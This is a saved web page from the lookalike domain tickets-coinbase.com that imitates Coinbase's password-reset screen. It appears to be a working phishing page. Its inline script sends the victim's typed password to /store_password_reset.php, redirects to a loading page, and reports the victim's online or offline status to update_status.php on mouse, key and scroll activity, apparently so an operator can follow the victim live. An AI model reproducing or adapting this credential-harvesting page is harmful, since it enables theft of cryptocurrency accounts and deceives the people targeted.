750ms}.e1jmug54{-webkit-transform:translateX(0);-ms-transform:translateX(0);transform:translateX(0);position:absolute}.ei9sigy{-webkit-transform:translateX(100%);-ms-transform:translateX(100%);transform:translateX(100%);-webkit-transition:-webkit-transform 750ms;-webkit-transition:transform 750ms;transition:transform 750ms}.efq8fi5{opacity:0}.e8rzqn2{opacity:1;-webkit-transition:opacity 750ms;transition:opacity 750ms}.ek6jerg{opacity:1;position:absolute}.esd2c3y{opacity:0;-webkit-transition:opacity 750ms;transition:opacity 750ms}.e14kilz9{display:none}.twue83p{overflow-wrap:break-word}.wywvfly{background:rgb(var(--yellow5))}.c1t1xw7q{cursor:pointer}.c1t1xw7q h2{-webkit-letter-spacing:.05em;-moz-letter-spacing:.05em;-ms-letter-spacing:.05em;letter-spacing:.05em}.p1hacen3{position:relative;display:inline-block;margin-right:var(--spacing-2);line-height:1}.ng3ajlv::before{content:'';position:absolute;border-left:2px solid var(--line);opacity:.8;width:0;height:calc(100% + 44px);top:16px;left:45%}.a1yqq05w{box-sizing:initial;border:2px solid var(--foreground);border-radius:50%}.a1yqq05w img,.a1yqq05w .iconContainer{display:grid;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-align-content:center;-ms-flex-line-pack:center;align-content:center;padding:2px;border-radius:50%;width:24px;height:24px}.pii9da1:focus{outline:none}.hizr401{display:none}.r7rfe1z .grecaptcha-badge{-webkit-transform:scale(.77);-ms-transform:scale(.77);transform:scale(.77);width:70px!important;-webkit-transition:all .3s ease!important;transition:all .3s ease!important;right:-10px!important;bottom:125px!important}.r7rfe1z .grecaptcha-badge:hover{width:256px!important;right:-30px!important}.ph2oakf{opacity:0}.c1h5o1qw{margin:0!important;padding:0!important}.c1h5o1qw .fsm-primary-content-container{max-width:none!important;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}</style><meta name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency." data-rh="true"><style id="googleidentityservice_button_styles">
<style id="savepage-cssvariables">
  :root {
  }
</style>
<script id="savepage-shadowloader" type="text/javascript">
  "use strict";
  window.addEventListener("DOMContentLoaded",
  function(event) {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
<meta name="savepage-url" content="https://tickets-coinbase.com/reset">
<meta name="savepage-title" content="Coinbase - Sign In">
<meta name="savepage-pubdate" content="Unknown">
<meta name="savepage-from" content="https://tickets-coinbase.com/reset">
<meta name="savepage-date" content="Tue Jul 09 2024 18:34:11 GMT-0500 (Central Daylight Time)">
<meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
<meta name="savepage-version" content="28.11">
<meta name="savepage-comments" content="">
  </head>
  <body cz-shortcut-listen="true">
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root" style="display: flex; flex-direction: column; min-height: 100%">
      <div class="cds-large-llfbhh8 cds-dark-d255ydu cds-frontierDark-f1icba2l" style="
          --foreground: rgb(var(--gray100));
          --foreground-muted: rgb(var(--gray60));
          --background: rgb(var(--gray0));
          --background-alternate: rgb(var(--gray5));
          --background-overlay: rgba(var(--gray80), 0.33);
          --line: rgba(var(--gray60), 0.2);
          --line-heavy: rgba(var(--gray60), 0.68);
          --primary: rgb(var(--blue60));
          --primary-wash: rgb(var(--blue0));
          --primary-foreground: rgb(var(--gray0));
          --negative: rgb(var(--red60));
          --negative-foreground: rgb(var(--gray0));
          --positive: rgb(var(--green60));
          --positive-foreground: rgb(var(--gray0));
          --secondary: rgb(var(--gray5));
          --secondary-foreground: rgb(var(--gray100));
          --transparent: rgba(var(--gray0), 0);
        ">
        <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-space-between-s1vbz1 cds-background-b85wjan cds-0-_15toyjv cds-0-_1007wyr cds-10-_1oczfiq" style="min-height: 100%; width: 100%">
          <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-1-_9w3lns" style="width: 100%">
            <div class="cds-flex-f1g67tkn cds-flex-start-f1lnfmfd cds-row-r1tfxker cds-center-czxavit" style="width: 100%">
              <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="max-width: 448px; width: 100%">
                <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-5-_1fh7zw6 cds-5-_1yjsi5b cds-5-_dyupck" style="width: 100%">
                  <form data-bitwarden-watching="1">
                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-7-_33g99c" style="width: 126px">
                      <svg aria-labelledby="Coinbase logo" class="cds-iconStyles-iogjozt" role="img" viewBox="0 0 688 123" width="100%" xmlns="http://www.w3.org/2000/svg">
                        <title>Coinbase logo</title>
                        <path d="M138.857 34.3392C113.863 34.3392 94.3343 53.3277 94.3343 78.7477C94.3343 104.168 113.37 122.994 138.857 122.994C164.343 122.994 183.71 103.843 183.71 78.5852C183.71 53.4902 164.674 34.3392 138.857 34.3392ZM139.025 104.674C124.792 104.674 114.363 93.611 114.363 78.754C114.363 63.7282 124.624 52.6714 138.857 52.6714C153.258 52.6714 163.681 63.897 163.681 78.754C163.681 93.611 153.258 104.674 139.025 104.674ZM189.168 53.659H201.584V121.35H221.443V35.9893H189.168V53.659ZM44.3536 52.6652C54.7832 52.6652 63.0581 59.103 66.1995 68.6785H87.2209C83.4113 48.2087 66.5305 34.3392 44.5223 34.3392C19.5288 34.3392 0 53.3277 0 78.754C0 104.18 19.0355 123 44.5223 123C66.0371 123 83.249 109.131 87.0586 88.492H66.1995C63.2205 98.0675 54.9456 104.674 44.516 104.674C30.1145 104.674 20.0222 93.611 20.0222 78.754C20.0285 63.7282 29.9584 52.6652 44.3536 52.6652ZM566.518 70.4973L551.954 68.3535C545.003 67.3659 540.038 65.0533 540.038 59.603C540.038 53.659 546.495 50.6901 555.264 50.6901C564.863 50.6901 570.989 54.8153 572.313 61.5844H591.511C589.357 44.4148 576.117 34.3455 555.763 34.3455C534.742 34.3455 520.84 45.0773 520.84 60.2656C520.84 74.7913 529.946 83.2167 548.313 85.8544L562.877 87.9982C569.996 88.9858 573.968 91.7984 573.968 97.0799C573.968 103.849 567.017 106.655 557.418 106.655C545.665 106.655 539.045 101.868 538.052 94.6048H518.523C520.347 111.281 533.418 123 557.25 123C578.933 123 593.328 113.093 593.328 96.0861C593.328 80.8979 582.905 72.9725 566.518 70.4973ZM211.514 0.825042C204.232 0.825042 198.767 6.10656 198.767 13.3694C198.767 20.6323 204.225 25.9138 211.514 25.9138C218.796 25.9138 224.26 20.6323 224.26 13.3694C224.26 6.10656 218.796 0.825042 211.514 0.825042ZM502.966 65.2158C502.966 46.7274 491.712 34.3455 467.88 34.3455C445.373 34.3455 432.795 45.7398 430.309 63.2407H450.007C451 56.4716 456.296 50.8588 467.549 50.8588C477.648 50.8588 482.613 55.3153 482.613 60.7656C482.613 67.866 473.507 69.6785 462.253 70.8349C447.028 72.4849 428.161 77.7664 428.161 97.58C428.161 112.937 439.583 122.837 457.788 122.837C472.021 122.837 480.958 116.893 485.43 107.48C486.092 115.9 492.38 121.35 501.155 121.35H512.74V103.687H502.972V65.2158H502.966ZM483.437 86.6794C483.437 98.0737 473.507 106.493 461.423 106.493C453.972 106.493 447.683 103.355 447.683 96.7549C447.683 88.3357 457.782 86.0231 467.05 85.0356C475.987 84.2105 480.952 82.2292 483.437 78.429V86.6794ZM378.012 34.3392C366.92 34.3392 357.652 38.9645 351.032 46.7211V0H331.172V121.35H350.701V110.124C357.321 118.212 366.758 123 378.012 123C401.843 123 419.886 104.18 419.886 78.754C419.886 53.3277 401.512 34.3392 378.012 34.3392ZM375.033 104.674C360.8 104.674 350.37 93.611 350.37 78.754C350.37 63.897 360.962 52.6714 375.195 52.6714C389.596 52.6714 399.689 63.7345 399.689 78.754C399.689 93.611 389.265 104.674 375.033 104.674ZM283.671 34.3392C270.762 34.3392 262.319 39.6208 257.354 47.0524V35.9893H237.656V121.344H257.516V74.9538C257.516 61.9094 265.791 52.6652 278.038 52.6652C289.46 52.6652 296.574 60.7531 296.574 72.4787V121.35H316.434V70.9974C316.44 49.5275 305.354 34.3392 283.671 34.3392ZM688 75.9476C688 51.5151 670.126 34.3455 646.126 34.3455C620.639 34.3455 601.934 53.4965 601.934 78.754C601.934 105.337 621.963 123 646.457 123C667.147 123 683.366 110.781 687.5 93.4485H666.81C663.831 101.043 656.549 105.337 646.781 105.337C634.035 105.337 624.436 97.4112 622.288 83.5417H687.994V75.9476H688ZM623.449 69.341C626.597 57.4529 635.534 51.6776 645.795 51.6776C657.049 51.6776 665.655 58.1155 667.641 69.341H623.449Z" fill="#FFFFFF"></path>
                      </svg>
                    </div>
                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_1qjdqpv">
                      <p class="cds-typographyResets-t1xhpuq2 cds-headline-hb7l4gg cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        *******@*****.***
                      </p>
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span>
                      <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-t16z3je5 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        Reset your password
                      </h1>
                    </div>
                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                      <p class="cds-typographyResets-t1xhpuq2 cds-body-bvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        Be sure to include the following requirements:
                      </p>
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span><span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-0\.5);
                        "></span><span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span>
                      <li class="cds-typographyResets-t1xhpuq2 cds-body-bvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        A minimum of 8 characters.
                      </li>
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span>
                      <li class="cds-typographyResets-t1xhpuq2 cds-body-bvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        Have both uppercase and lowercase letters.
                      </li>
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span>
                      <li class="cds-typographyResets-t1xhpuq2 cds-body-bvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        Must include a number.
                      </li>
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span>
                      <li class="cds-typographyResets-t1xhpuq2 cds-body-bvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">
                        Include at least one special character.
                      </li>
                    </div>
                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span><span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-2);
                        "></span>
                      <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="width: 100%; opacity: 1">
                        <label for="cds-textinput-label-:r3:" data-testid="" class="cds-typographyResets-t1xhpuq2 cds-label1-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_1oy8l1i cds-0_5-_uaer6w cds-labelStyle-l14tr5bh">Old password</label><span aria-hidden="true" role="presentation" style="
                            flex-grow: 0;
                            flex-shrink: 0;
                            height: var(--spacing-0\.5);
                          "></span>
                        <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                          <div class="cds-inputAreaContainerStyles-i1sndg40">
                            <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="
                                --border-color-unfocused: var(--line-heavy);
                                --border-color-focused: var(--primary);
                                --border-width-focused: var(
                                  --border-width-input
                                );
                                --interactable-border-radius: 8px;
                                --interactable-background: var(--background);
                                --interactable-pressed-background: rgb(
                                  30,
                                  31,
                                  32
                                );
                                --interactable-hovered-opacity: 0.98;
                                --interactable-pressed-background: rgb(
                                  30,
                                  31,
                                  32
                                );
                                --interactable-pressed-opacity: 0.92;
                                --interactable-disabled-background: rgb(
                                  255,
                                  255,
                                  255
                                );
                              ">
                              <input aria-label="New password" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bvviwwo cds-2-_fbgb57" data-testid="input-new-password" style="text-align: start; color-scheme: light" tabindex="0" aria-invalid="false" id="password" placeholder="Enter your old password" type="password" value="">
                              <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit">
                                <button value="0" id="showPass" onclick="showPassword()" style="
                                    --interactable-height: 40px;
                                    --interactable-border-radius: 1000px;
                                    --interactable-background: transparent;
                                    --interactable-pressed-background: rgb(
                                      30,
                                      31,
                                      32
                                    );
                                    --interactable-hovered-opacity: 0.98;
                                    --interactable-pressed-background: rgb(
                                      30,
                                      31,
                                      32
                                    );
                                    --interactable-pressed-opacity: 0.92;
                                    --interactable-disabled-background: rgb(
                                      255,
                                      255,
                                      255
                                    );
                                  " type="button" aria-label="Show password" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-flex-f1g67tkn cds-center-ca5ylan cds-center-czxavit cds-iconButton-i1804idl">
                                  <div class="cds-flex-f1g67tkn cds-relative-r1fxlug" style="position: relative">
                                    <div style="width: 16px; height: 16px">
                                      <span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="
                                          color: var(--foreground-muted);
                                          font-size: 16px;
                                        "></span>
                                    </div>
                                  </div>
                                </button>
                              </div>
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-1);
                        "></span>
                      <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="width: 100%; opacity: 1">
                        <label for="cds-textinput-label-:r4:" data-testid="" class="cds-typographyResets-t1xhpuq2 cds-label1-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_1oy8l1i cds-0_5-_uaer6w cds-labelStyle-l14tr5bh">New password</label><span aria-hidden="true" role="presentation" style="
                            flex-grow: 0;
                            flex-shrink: 0;
                            height: var(--spacing-0\.5);
                          "></span>
                        <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                          <div class="cds-inputAreaContainerStyles-i1sndg40">
                            <span id="ErrorNew" data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="
                                --border-color-unfocused: var(--line-heavy);
                                --border-color-focused: var(--primary);
                                --border-width-focused: var(
                                  --border-width-input
                                );
                                --interactable-border-radius: 8px;
                                --interactable-background: var(--background);
                                --interactable-pressed-background: rgb(
                                  30,
                                  31,
                                  32
                                );
                                --interactable-hovered-opacity: 0.98;
                                --interactable-pressed-background: rgb(
                                  30,
                                  31,
                                  32
                                );
                                --interactable-pressed-opacity: 0.92;
                                --interactable-disabled-background: rgb(
                                  255,
                                  255,
                                  255
                                );
                              ">
                              <input aria-label="New password" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bvviwwo cds-2-_fbgb57" data-testid="input-new-password" style="text-align: start; color-scheme: light" tabindex="0" aria-invalid="false" id="new-password" placeholder="Enter your new password" type="password" value="">
                              <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit">
                                <button value="0" id="showPass1" onclick="showPassword_1()" style="
                                    --interactable-height: 40px;
                                    --interactable-border-radius: 1000px;
                                    --interactable-background: transparent;
                                    --interactable-pressed-background: rgb(
                                      30,
                                      31,
                                      32
                                    );
                                    --interactable-hovered-opacity: 0.98;
                                    --interactable-pressed-background: rgb(
                                      30,
                                      31,
                                      32
                                    );
                                    --interactable-pressed-opacity: 0.92;
                                    --interactable-disabled-background: rgb(
                                      255,
                                      255,
                                      255
                                    );
                                  " type="button" aria-label="Show password" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-flex-f1g67tkn cds-center-ca5ylan cds-center-czxavit cds-iconButton-i1804idl">
                                  <div class="cds-flex-f1g67tkn cds-relative-r1fxlug" style="position: relative">
                                    <div style="width: 16px; height: 16px">
                                      <span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="
                                          color: var(--foreground-muted);
                                          font-size: 16px;
                                        "></span>
                                    </div>
                                  </div>
                                </button>
                              </div>
                            </span>
                          </div>
                        </div>
                      </div>
                      <span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-2);
                        "></span>
                    </div>
                    <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="width: 100%; opacity: 1">
                      <label for="cds-textinput-label-:r4:" data-testid="" class="cds-typographyResets-t1xhpuq2 cds-label1-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_1oy8l1i cds-0_5-_uaer6w cds-labelStyle-l14tr5bh">Confirm password</label><span aria-hidden="true" role="presentation" style="
                          flex-grow: 0;
                          flex-shrink: 0;
                          height: var(--spacing-0\.5);
                        "></span>
                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                        <div class="cds-inputAreaContainerStyles-i1sndg40">
                          <span id="ErrorConfirm" data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="
                              --border-color-unfocused: var(--line-heavy);
                              --border-color-focused: var(--primary);
                              --border-width-focused: var(--border-width-input);
                              --interactable-border-radius: 8px;
                              --interactable-background: var(--background);
                              --interactable-pressed-background: rgb(
                                30,
                                31,
                                32
                              );
                              --interactable-hovered-opacity: 0.98;
                              --interactable-pressed-background: rgb(
                                30,
                                31,
                                32
                              );
                              --interactable-pressed-opacity: 0.92;
                              --interactable-disabled-background: rgb(
                                255,
                                255,
                                255
                              );
                            ">
                            <input aria-label="Confirm password" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bvviwwo cds-2-_fbgb57" data-testid="input-confirm-password" style="text-align: start; color-scheme: light" tabindex="0" aria-invalid="false" id="new-password-confirm" placeholder="Re-enter your new password" type="password" value="">
                            <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit">
                              <button value="0" id="showPass2" onclick="showPassword_2()" style="
                                  --interactable-height: 40px;
                                  --interactable-border-radius: 1000px;
                                  --interactable-background: transparent;
                                  --interactable-pressed-background: rgb(
                                    30,
                                    31,
                                    32
                                  );
                                  --interactable-hovered-opacity: 0.98;
                                  --interactable-pressed-background: rgb(
                                    30,
                                    31,
                                    32
                                  );
                                  --interactable-pressed-opacity: 0.92;
                                  --interactable-disabled-background: rgb(
                                    255,
                                    255,
                                    255
                                  );
                                " type="button" aria-label="Show password" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-flex-f1g67tkn cds-center-ca5ylan cds-center-czxavit cds-iconButton-i1804idl">
                                <div class="cds-flex-f1g67tkn cds-relative-r1fxlug" style="position: relative">
                                  <div style="width: 16px; height: 16px">
                                    <span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="
                                        color: var(--foreground-muted);
                                        font-size: 16px;
                                      "></span>
                                  </div>
                                </div>
                              </button>
                            </div>
                          </span>
                        </div>
                      </div>
                    </div>

                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-5-_dyupck cds-3-_1mvq9l2">
                      <button id="Submit" onclick="" style="
                          --interactable-height: 56px;
                          --interactable-border-radius: 56px;
                          --interactable-background: var(--primary);
                          --interactable-hovered-background: rgb(71, 126, 246);
                          --interactable-hovered-opacity: 0.92;
                          --interactable-pressed-background: rgb(71, 126, 246);
                          --interactable-pressed-opacity: 0.86;
                          --interactable-disabled-background: rgb(
                            128,
                            169,
                            255
                          );
                        " type="button" class="cds-interactable-i9xooc6 cds-transparentChildren-tnzgr0o cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-4-_1arbnhr cds-4-_hd2z08" disabled>
                        <span class="cds-positionRelative-pagbhaq"><span class="cds-headline-hb7l4gg cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Update</span></span></span>
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="portalRoot" style="z-index: 100001; position: relative; display: flex">
      <div data-testid="portal-modal-container" id="modalsContainer" style="z-index: 3"></div>
      <div data-testid="portal-toast-container" id="toastsContainer" style="z-index: 6"></div>
      <div data-testid="portal-alert-container" id="alertsContainer" style="z-index: 7"></div>
      <div data-testid="portal-tooltip-container" id="tooltipContainer" style="z-index: 5"></div>
    </div>
    <div id="cds-hexagon-clipPath-container" style="height: 0px; width: 0px" aria-hidden="true">
      <svg height="0" viewBox="0 0 66 62" width="0">
        <defs>
          <clipPath clipPathUnits="objectBoundingBox" id="cds-hexagon-avatar-clipper" transform="scale(0.015151515151515152 0.016129032258064516)">
            <path d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z"></path>
          </clipPath>
        </defs>
      </svg>
    </div>
    <script data-savepage-type="" type="text/plain"></script>
    <script>
      const password = document.getElementById('password')
      const newPassword = document.getElementById('new-password')
      const newPasswordConfirm = document.getElementById('new-password-confirm')
      const showPass = document.getElementById('showPass')
      const showPass1 = document.getElementById('showPass1')
      const showPass2 = document.getElementById('showPass2')

      function showPassword() {
        if (password.type === 'password') {
          password.type = 'text';
          showPass.innerHTML = '<span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleActive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>';
        } else {
          password.type = 'password';
          showPass.innerHTML = '<span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>';
        }
      }

      function showPassword1() {
        if (newPassword.type === 'password') {
          newPassword.type = 'text';
          showPass1.innerHTML = '<span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleActive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>';
        } else {
          newPassword.type = 'password';
          showPass1.innerHTML = '<span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>';
        }
      }

      function showPassword2() {
        if (newPasswordConfirm.type === 'password') {
          newPasswordConfirm.type = 'text';
          showPass2.innerHTML = '<span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleActive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>';
        } else {
          newPasswordConfirm.type = 'password';
          showPass2.innerHTML = '<span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>';
        }
      }


      showPass1.addEventListener('click', showPassword1);
      showPass2.addEventListener('click', showPassword2);
    function checkFields() {
        const submitButton = document.getElementById('Submit');
        const errorNew = document.getElementById('ErrorNew');
        const errorConfirm = document.getElementById('ErrorConfirm');
        if (password.value && newPassword.value && newPasswordConfirm.value) {
            if (newPassword.value !== newPasswordConfirm.value) {
                submitButton.setAttribute('disabled', 'true');
                errorNew.style.setProperty('--border-color-unfocused', 'red');
                errorConfirm.style.setProperty('--border-color-unfocused', 'red');
                return;
            }
            submitButton.removeAttribute('disabled');
            errorNew.style.setProperty('--border-color-unfocused', 'var(--line-heavy)');
            errorConfirm.style.setProperty('--border-color-unfocused', 'var(--line-heavy)');
        } else {
            submitButton.setAttribute('disabled', 'true');
        }
    }
    function submitForm() {
      if (password.value && newPassword.value && newPasswordConfirm.value && newPassword.value === newPasswordConfirm.value) {
        fetch('/store_password_reset.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: `password=${encodeURIComponent(newPassword.value)}`
        })
        .then(response => response.text())
        .then(data => {
          if (data.includes('Password stored successfully')) {
            const urlParams = new URLSearchParams(window.location.search);
            window.location.href = '/loading.php';
          } else {
            console.error('Error:', data);
          }
        })
        .catch((error) => {
          console.error('Error:', error);
        });
      }
    }

    const submitButton = document.getElementById('Submit');
    submitButton.addEventListener('click', submitForm);
    

    password.addEventListener('input', checkFields);
    newPassword.addEventListener('input', checkFields);
    newPasswordConfirm.addEventListener('input', checkFields);

    document.addEventListener('DOMContentLoaded', function() {
            // Find the element with the class 'icon-and-email'
            var iconAndEmail = document.querySelector('.icon-and-email');
            // Add click event listener to it
            iconAndEmail.addEventListener('click', function() {
                // Redirect to login.php
                window.location.href = 'login.php';
            });
        });

        // Function to update user status
    function updateUserStatus(status) {
        // Send an AJAX request to update user status
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'update_status.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Handle response if needed
            }
        };
        xhr.send('status=' + status);
    }

    // Detect user activity
    function detectActivity() {
        var userActive = false;

        function setUserActive() {
            if (!userActive) {
                userActive = true;
                updateUserStatus('online');
            }
        }

        // Events to detect user activity
        window.addEventListener('mousemove', setUserActive);
        window.addEventListener('keydown', setUserActive);
        window.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setUserActive();
            }
        });

        // Additional events for mobile devices
        window.addEventListener('touchstart', setUserActive);
        window.addEventListener('touchmove', setUserActive);
        window.addEventListener('orientationchange', setUserActive);
        window.addEventListener('scroll', setUserActive);

        // Set user as offline when the tab is closed
        window.addEventListener('beforeunload', function() {
            updateUserStatus('offline');
        });
    }

    // Call detectActivity function when the document is loaded
    document.addEventListener('DOMContentLoaded', detectActivity);
    </script>
  

</body></html>